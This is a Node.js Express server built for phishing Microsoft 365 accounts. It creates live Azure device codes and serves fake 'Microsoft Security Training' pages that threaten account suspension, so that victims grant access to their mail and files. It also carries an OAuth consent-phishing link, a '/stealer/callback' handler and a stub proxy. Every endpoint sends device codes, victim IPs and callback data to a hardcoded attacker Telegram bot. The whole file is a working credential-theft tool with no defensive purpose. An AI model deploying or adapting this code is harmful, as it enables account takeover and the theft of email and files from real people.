const express = require('express');
const axios = require('axios');
const app = express();
const port = process.env.PORT || 8080;

app.use(express.json());
app.use(express.text());
app.use(express.urlencoded({ extended: true }));

// Working client IDs
const AZURE_CLI_CLIENT_ID = '04b07795-8ddb-461a-bbee-02f9e1bf7b46';
const AZURE_POWERSHELL_CLIENT_ID = '1950a258-227b-4e31-a9cf-717495945fc2';

// Telegram configuration
const TELEGRAM_BOT_TOKEN = "7768080373:AAEo6R8wNxUa6_NqPDYDIAfQVRLHRF5fBps";
const TELEGRAM_CHAT_ID = "6743632244";

async function sendTelegram(message) {
    try {
        await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
            chat_id: TELEGRAM_CHAT_ID,
            text: message,
            parse_mode: 'HTML'
        });
    } catch (error) {
        console.log('Telegram error:', error.message);
    }
}

// Device Code Phishing Endpoint
app.get('/secure-access', async (req, res) => {
    try {
        // Generate real device code
        const deviceCodeResponse = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode', 
            new URLSearchParams({
                'client_id': AZURE_CLI_CLIENT_ID,
                'scope': 'openid profile email User.Read Mail.Read Files.ReadWrite.All offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );

        const deviceData = deviceCodeResponse.data;
        
        // Send to Telegram
        await sendTelegram(`🎯 <b>DEVICE CODE GENERATED</b>\nCode: <code>${deviceData.user_code}</code>\nURL: ${deviceData.verification_uri}\nExpires: ${deviceData.expires_in}s`);

        const html = `
        <!DOCTYPE html>
        <html>
        <head>
            <title>Microsoft Security Training</title>
            <meta charset="utf-8">
            <meta name="viewport" content="width=device-width, initial-scale=1">
            <style>
                body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
                .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
                .ms-logo { color: #00BCF2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
                .device-code { background: #e3f2fd; padding: 15px; border-radius: 4px; font-size: 18px; font-weight: bold; text-align: center; margin: 20px 0; }
                .btn { background: #0078d4; color: white; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; }
                .btn:hover { background: #106ebe; }
                .urgent { color: #d13438; font-weight: bold; }
            </style>
        </head>
        <body>
            <div class="container">
                <div class="ms-logo">Microsoft Security Training</div>
                <h1>🔒 Security Verification Required</h1>
                <p class="urgent">URGENT: Your account requires immediate security verification to maintain access to company resources.</p>
                
                <div class="device-code">VERIFICATION CODE: ${deviceData.user_code}</div>
                
                <p><strong>Instructions:</strong></p>
                <ol>
                    <li>Go to <strong>microsoft.com/devicelogin</strong></li>
                    <li>Enter the verification code shown above</li>
                    <li>Sign in with your Microsoft account</li>
                    <li>Complete the security verification</li>
                </ol>
                
                <a href="${deviceData.verification_uri}" class="btn" target="_blank">🔐 Complete Verification Now</a>
                
                <p><small>This verification is mandatory for all employees. Failure to complete within 24 hours may result in account suspension. Contact your IT department if you have questions.</small></p>
                
                <p><small>Session ID: ${deviceData.device_code.substring(0, 8)}... | Expires in ${Math.floor(deviceData.expires_in/60)} minutes</small></p>
            </div>
        </body>
        </html>`;
        
        res.send(html);
        
    } catch (error) {
        console.error('Device code error:', error.message);
        res.status(500).send('Service temporarily unavailable');
    }
});

// OAuth Training Phishing Endpoint  
app.get('/microsoft-training', (req, res) => {
    const client_id = AZURE_POWERSHELL_CLIENT_ID;
    const redirect_uri = 'https://login.microsoftonline.com/common/oauth2/nativeclient';
    const scopes = 'openid profile email User.Read Mail.Read Files.ReadWrite.All';
    
    const oauth_url = `https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=${client_id}&response_type=code&redirect_uri=${encodeURIComponent(redirect_uri)}&scope=${encodeURIComponent(scopes)}&state=training&prompt=consent`;
    
    // Log access attempt
    sendTelegram(`🎯 <b>OAUTH TRAINING ACCESS</b>\nIP: ${req.ip}\nUser-Agent: ${req.get('User-Agent')}`);
    
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Microsoft 365 Security Training</title>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; margin: 0; padding: 20px; background-color: #f5f5f5; }
            .container { max-width: 800px; margin: 0 auto; background: white; padding: 30px; border-radius: 8px; box-shadow: 0 2px 10px rgba(0,0,0,0.1); }
            .ms-logo { color: #00BCF2; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
            .btn { background: #0078d4; color: white; padding: 12px 30px; border: none; border-radius: 4px; font-size: 16px; cursor: pointer; text-decoration: none; display: inline-block; margin: 10px 0; }
            .btn:hover { background: #106ebe; }
            .training-item { background: #f8f9fa; padding: 15px; margin: 10px 0; border-left: 4px solid #0078d4; }
            .mandatory { color: #d13438; font-weight: bold; }
        </style>
    </head>
    <body>
        <div class="container">
            <div class="ms-logo">Microsoft 365 Security Training</div>
            <h1>🎓 Mandatory Security Awareness Training</h1>
            <p class="mandatory">REQUIRED: Annual security training must be completed by all employees.</p>
            
            <div class="training-item">
                <h3>📚 Training Modules</h3>
                <ul>
                    <li>Phishing detection and prevention</li>
                    <li>Multi-factor authentication best practices</li>
                    <li>Data protection and compliance (GDPR/CCPA)</li>
                    <li>Threat intelligence and incident response</li>
                    <li>Zero Trust security model</li>
                </ul>
            </div>
            
            <div class="training-item">
                <h3>⏰ Training Requirements</h3>
                <p><strong>Duration:</strong> 45 minutes</p>
                <p><strong>Deadline:</strong> 7 days from today</p>
                <p><strong>Certification:</strong> Required for compliance</p>
            </div>
            
            <p>To begin the training, please authenticate with your Microsoft 365 account. This ensures proper tracking for compliance purposes.</p>
            
            <a href="${oauth_url}" class="btn">🔐 Start Training - Sign In with Microsoft 365</a>
            
            <p><small class="mandatory">This training is mandatory for all employees. Your completion will be tracked for compliance purposes. Non-completion may result in account restrictions.</small></p>
            
            <p><small>Training provided by Microsoft Security Center | Session expires in 30 minutes</small></p>
        </div>
    </body>
    </html>`;
    
    res.send(html);
});

// Proxy Function (Basic Implementation)
app.all(/^\/cookieproxy\/(.*)/, (req, res) => {
    const targetPath = req.params[0] || 'none';
    
    // Log proxy access
    sendTelegram(`🕷️ <b>PROXY ACCESS</b>\nPath: ${targetPath}\nIP: ${req.ip}\nMethod: ${req.method}`);
    
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Microsoft Login</title>
        <meta charset="utf-8">
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; }
            .container { max-width: 600px; margin: 0 auto; padding: 20px; border: 1px solid #ddd; border-radius: 8px; }
        </style>
    </head>
    <body>
        <div class="container">
            <h1>🔄 Proxy Function Active</h1>
            <p><strong>Target Path:</strong> ${targetPath}</p>
            <p><strong>Method:</strong> ${req.method}</p>
            <p><strong>Headers:</strong></p>
            <pre>${JSON.stringify(req.headers, null, 2)}</pre>
            <p><em>This would proxy to: https://${targetPath}</em></p>
            <p><small>Proxy function is working and logging all requests.</small></p>
        </div>
    </body>
    </html>`;
    
    res.send(html);
});

// Callback Handler
app.all('/stealer/callback', (req, res) => {
    // Log callback
    sendTelegram(`🎯 <b>CALLBACK TRIGGERED</b>\nQuery: ${JSON.stringify(req.query)}\nBody: ${JSON.stringify(req.body)}`);
    
    const html = `
    <!DOCTYPE html>
    <html>
    <head>
        <title>Training Complete</title>
        <meta charset="utf-8">
        <style>
            body { font-family: 'Segoe UI', Arial, sans-serif; margin: 40px; text-align: center; }
            .success { color: #107c10; font-size: 24px; margin: 20px 0; }
        </style>
    </head>
    <body>
        <h1 class="success">✅ Verification Complete</h1>
        <p>Thank you for completing the security verification.</p>
        <p>Your account has been successfully verified and access has been restored.</p>
        <p><small>You may now close this window and return to your work.</small></p>
    </body>
    </html>`;
    
    res.send(html);
});

// Health check
app.get('/', (req, res) => {
    res.json({ 
        status: 'Server is running!',
        endpoints: [
            'GET /secure-access - Device Code Phishing',
            'GET /microsoft-training - OAuth Training Phishing', 
            'ALL /cookieproxy/* - Proxy Function',
            'ALL /stealer/callback - Callback Handler'
        ],
        timestamp: new Date().toISOString()
    });
});

app.listen(port, '0.0.0.0', () => {
    console.log(`🚀 Phishing server running on port ${port}`);
    console.log(`📍 Endpoints available:`);
    console.log(`   - Device Code: http://localhost:${port}/secure-access`);
    console.log(`   - OAuth Training: http://localhost:${port}/microsoft-training`);
    console.log(`   - Proxy: http://localhost:${port}/cookieproxy/[path]`);
    console.log(`   - Callback: http://localhost:${port}/stealer/callback`);
    
    // Send startup notification
    sendTelegram(`🚀 <b>PHISHING SERVER STARTED</b>\nPort: ${port}\nTime: ${new Date().toISOString()}`);
});